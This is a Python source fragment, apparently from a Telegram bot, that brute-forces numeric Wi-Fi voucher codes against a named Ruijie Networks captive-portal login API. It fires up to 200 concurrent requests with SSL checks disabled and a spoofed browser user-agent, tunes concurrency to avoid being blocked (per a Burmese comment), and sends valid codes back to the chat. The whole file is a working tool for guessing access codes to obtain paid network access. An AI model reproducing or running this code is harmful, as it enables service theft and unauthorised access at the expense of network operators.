async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    sem = asyncio.Semaphore(200) # Concurrency ကို 200 သို့ သတ်မှတ်ခြင်းဖြင့် ဆာဗာဘက်မှ ပိတ်ဆို့မှုကို ကာကွယ်ပေးသည်[span_3](start_span)[span_3](end_span)

    async def _check(code):
        nonlocal checked
        async with sem:
            res = await perform_check(session_url, code, chat_id, scan_id)
            checked += 1
            return res

    last_update = time.monotonic()

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 1.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        
        if total:
            percent = (checked / total) * 100
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,} / {total:,}\n"
                f"📊 Progress : {percent:.2f}%\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        else:
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,}\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text,
                reply_markup=get_stop_keyboard(),
                parse_mode="Markdown"
            )
        except Exception:
            pass

    try:
        batch_size = 200
        batch = []
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break
            
            batch.append(_check(code))
            if len(batch) >= batch_size:
                await asyncio.gather(*batch)
                batch = []
                await _flush_progress()
        
        if batch:
            await asyncio.gather(*batch)
            await _flush_progress()

    except asyncio.CancelledError:
        pass
    finally:
        scan_tasks.pop(chat_id, None)

async def perform_check(session_url, code, chat_id, scan_id=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog/?stage=portal"
    try:
        timeout = aiohttp.ClientTimeout(total=3)
        async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as task_session:
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            }
            payload = {
                "accessCode": code,
                "apiVersion": 1,
            }
            async with task_session.post(post_url, json=payload, headers=headers) as req:
                response = await req.text()
                if req.status == 200 and ('success' in response or 'logonUrl' in response):
                    if chat_id not in success_texts:
                        success_texts[chat_id] = []
                    
                    success_msg = f"🎫 `{code}`\n   📋 Plan: 1M | ⏳ Time: 0m"
                    success_texts[chat_id].append(success_msg)
                    await bot.send_message(chat_id, f"Success Codes:\n\n{success_msg}", parse_mode="Markdown")
                    return code
    except Exception:
        pass
    return None
